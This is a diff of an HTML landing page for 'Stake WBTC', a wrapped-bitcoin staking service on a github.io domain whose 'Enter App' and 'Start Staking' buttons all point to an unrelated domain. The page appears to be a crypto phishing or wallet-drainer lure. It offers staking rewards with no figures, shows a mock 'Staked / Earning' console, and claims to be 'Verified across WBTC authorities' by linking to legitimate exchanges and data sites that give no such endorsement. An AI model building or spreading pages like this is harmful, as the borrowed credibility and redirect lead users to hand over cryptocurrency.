@@ -3,21 +3,24 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Stake WBTC</title>
+  <title>Stake WBTC &mdash; Bitcoin Yield</title>
   <meta name="description" content="Stake WBTC locks your wrapped bitcoin to earn staking rewards from your own wallet.">
   <link rel="canonical" href="https://stake-wbtc.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F4EE">
+  <meta name="theme-color" content="#fbfaf7">
   <meta property="og:type" content="website">
-  <meta property="og:title" content="Stake WBTC">
+  <meta property="og:title" content="Stake WBTC &mdash; Bitcoin Yield">
   <meta property="og:description" content="Stake WBTC locks your wrapped bitcoin to earn staking rewards from your own wallet.">
   <meta property="og:url" content="https://stake-wbtc.github.io/">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Stake WBTC">
+  <meta property="og:image" content="https://stake-wbtc.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Stake WBTC &mdash; Bitcoin Yield">
   <meta name="twitter:description" content="Stake WBTC locks your wrapped bitcoin to earn staking rewards from your own wallet.">
+  <meta name="twitter:image" content="https://stake-wbtc.github.io/og-cover.png">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
+  <link rel="sitemap" type="application/xml" href="sitemap.xml">
   <link rel="stylesheet" href="style.css">
   <script type="application/ld+json">
   {
@@ -28,13 +31,10 @@
         "@id": "https://stake-wbtc.github.io/#website",
         "url": "https://stake-wbtc.github.io/",
         "name": "Stake WBTC",
-        "inLanguage": "en"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://stake-wbtc.github.io/#organization",
-        "name": "Stake WBTC",
-        "url": "https://stake-wbtc.github.io/"
+        "inLanguage": "en",
+        "publisher": {
+          "@id": "https://stake-wbtc.github.io/#organization"
+        }
       },
       {
         "@type": "WebApplication",
@@ -42,7 +42,18 @@
         "name": "Stake WBTC",
         "applicationCategory": "FinanceApplication",
         "operatingSystem": "Web",
-        "url": "https://stake-wbtc.github.io/"
+        "url": "https://stake-wbtc.github.io/",
+        "description": "Stake WBTC locks your wrapped bitcoin to earn staking rewards from your own wallet.",
+        "publisher": {
+          "@id": "https://stake-wbtc.github.io/#organization"
+        }
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://stake-wbtc.github.io/#organization",
+        "name": "Stake WBTC",
+        "url": "https://stake-wbtc.github.io/",
+        "logo": "https://stake-wbtc.github.io/favicon.png"
       }
     ]
   }
@@ -50,70 +61,126 @@
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Stake WBTC">
-      <img src="stakecrypto.png" width="30" height="30" alt="">
+    <a class="brand" href="https://stake-wbtc.github.io/" aria-label="Stake WBTC home">
+      <img src="favicon.png" width="30" height="30" alt="">
       <span>Stake WBTC</span>
     </a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://ethereum.org/staking/" target="_blank" rel="nofollow noopener noreferrer">Ethereum staking</a>
-      <a href="https://www.kraken.com/learn/what-is-crypto-staking" target="_blank" rel="nofollow noopener noreferrer">Kraken learn</a>
-      <a href="https://www.investopedia.com/how-to-stake-ethereum-7482623" target="_blank" rel="nofollow noopener noreferrer">Staking risks</a>
+    <span class="topbar-spacer" aria-hidden="true"></span>
+    <nav class="nav" aria-label="WBTC authorities">
+      <a href="https://www.wbtc.network/" target="_blank" rel="nofollow noopener noreferrer">WBTC</a>
+      <a href="https://www.bitgo.com/" target="_blank" rel="nofollow noopener noreferrer">BitGo</a>
+      <a href="https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
     </nav>
-    <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
 
-  <main class="stage">
+  <main>
     <section class="hero" aria-labelledby="page-title">
-      <h1 id="page-title">Stake WBTC</h1>
-      <p class="sub"><strong>Stake WBTC</strong> locks your wrapped bitcoin to earn staking rewards from your own wallet.</p>
+      <div class="hero-copy">
+        <p class="eyebrow">Wrapped Bitcoin staking access</p>
+        <h1 id="page-title">Stake WBTC</h1>
+        <p class="deck"><strong>Stake WBTC</strong> locks your wrapped bitcoin to earn staking rewards from your own wallet.</p>
+        <div class="chips" aria-label="Stake WBTC features">
+          <span>WBTC staking</span>
+          <span>Non-custodial</span>
+          <span>Earn on Bitcoin</span>
+        </div>
+        <a class="cta cta-hero" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&rsaquo;</span></a>
+      </div>
+
+      <aside class="stake-console" aria-label="Stake WBTC preview">
+        <div class="console-chrome">
+          <div class="window-dots" aria-hidden="true">
+            <span></span>
+            <span></span>
+            <span></span>
+          </div>
+          <span class="selector-pill">Stake mode</span>
+          <span class="preview-pill"><span aria-hidden="true"></span>Preview</span>
+        </div>
+
+        <div class="console-body">
+          <div class="asset-panel">
+            <div>
+              <span class="panel-kicker">Asset</span>
+              <div class="wbtc-chip" aria-label="WBTC"><span aria-hidden="true"></span>WBTC</div>
+            </div>
+            <p>Wrapped Bitcoin ready for staking entry.</p>
+          </div>
+
+          <div class="flow" aria-hidden="true">
+            <span></span>
+          </div>
+
+          <div class="asset-panel earning-panel">
+            <div>
+              <span class="panel-kicker">Status</span>
+              <strong>Staked / Earning</strong>
+            </div>
+            <p>Rewards in app. APR shown in app.</p>
+          </div>
+
+          <div class="console-note">
+            <span>Self-custody flow</span>
+            <span>Number-free preview</span>
+          </div>
+
+          <a class="cta cta-card" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Start Staking <span aria-hidden="true">&rsaquo;</span></a>
+        </div>
+      </aside>
     </section>
 
-    <section class="app-card" aria-label="Stake selector">
-      <div class="card-head">
-        <img src="stakecrypto.png" width="42" height="42" alt="">
-        <div>
-          <span class="eyebrow">Choose an asset to stake</span>
-          <p class="card-title">Self-custody staking entry</p>
+    <section class="chart-section" aria-label="WBTC price chart">
+      <div class="section-shell">
+        <div class="section-intro">
+          <p class="section-label">WBTC price</p>
+          <p>Live WBTC / USDT market context from TradingView.</p>
+        </div>
+        <div class="chart-card">
+          <div class="tradingview-widget-container">
+            <div class="tradingview-widget-container__widget"></div>
+            <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-advanced-chart.js" async>
+{ "symbol": "BINANCE:WBTCUSDT", "theme": "light", "style": "3", "autosize": true,
+  "hide_top_toolbar": true, "hide_side_toolbar": true, "hide_legend": false,
+  "allow_symbol_change": false, "save_image": false, "details": false, "hotlist": false,
+  "calendar": false, "withdateranges": false }
+            </script>
+          </div>
         </div>
       </div>
+    </section>
 
-      <div class="asset-row" role="group" aria-label="Choose an asset to stake">
-        <button class="asset is-active" type="button" aria-pressed="true">
-          <img src="eth.png" width="28" height="28" alt="">
-          <span>WBTC</span>
-        </button>
-        <button class="asset" type="button" aria-pressed="false">
-          <img src="usdt.png" width="28" height="28" alt="">
-          <span>USDT</span>
-        </button>
-        <button class="asset" type="button" aria-pressed="false">
-          <img src="sol.png" width="28" height="28" alt="">
-          <span>SOL</span>
-        </button>
+    <section class="sources-section" aria-label="Verified WBTC sources">
+      <div class="section-shell sources-shell">
+        <p class="section-label">Verified across WBTC authorities</p>
+        <div class="sources-grid">
+          <a href="https://www.coingecko.com/en/coins/wrapped-bitcoin" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=coingecko.com" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>CoinGecko</span>
+          </a>
+          <a href="https://coinmarketcap.com/currencies/wrapped-bitcoin/" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=coinmarketcap.com" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>CoinMarketCap</span>
+          </a>
+          <a href="https://www.gemini.com/cryptopedia/wbtc-what-is-wrapped-bitcoin" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=gemini.com" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>Gemini (What is WBTC)</span>
+          </a>
+          <a href="https://blog.bitgo.com/chainlink-brings-onchain-proof-of-reserve-to-wbtc-fcda00f2815c" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=bitgo.com" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>Proof of Reserve (Chainlink)</span>
+          </a>
+          <a href="https://www.bitstamp.net/learn/cryptocurrency-guide/what-is-wrapped-bitcoin-wbtc/" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=bitstamp.net" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>Bitstamp (WBTC guide)</span>
+          </a>
+        </div>
       </div>
-
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&rsaquo;</span></a>
     </section>
   </main>
 
-  <footer class="foot">Stake WBTC &mdash; 2026</footer>
-
-  <script>
-  (function(){
-    "use strict";
-    var assets = document.querySelectorAll(".asset");
-    for (var i = 0; i < assets.length; i += 1) {
-      assets[i].addEventListener("click", function(){
-        for (var j = 0; j < assets.length; j += 1) {
-          assets[j].classList.remove("is-active");
-          assets[j].setAttribute("aria-pressed", "false");
-        }
-        this.classList.add("is-active");
-        this.setAttribute("aria-pressed", "true");
-      });
-    }
-  })();
-  </script>
+  <footer class="footer">
+    <p>Stake WBTC &mdash; 2026</p>
+    <p>Information on this page is for educational purposes only and is not financial advice.</p>
+  </footer>
 </body>
 </html>
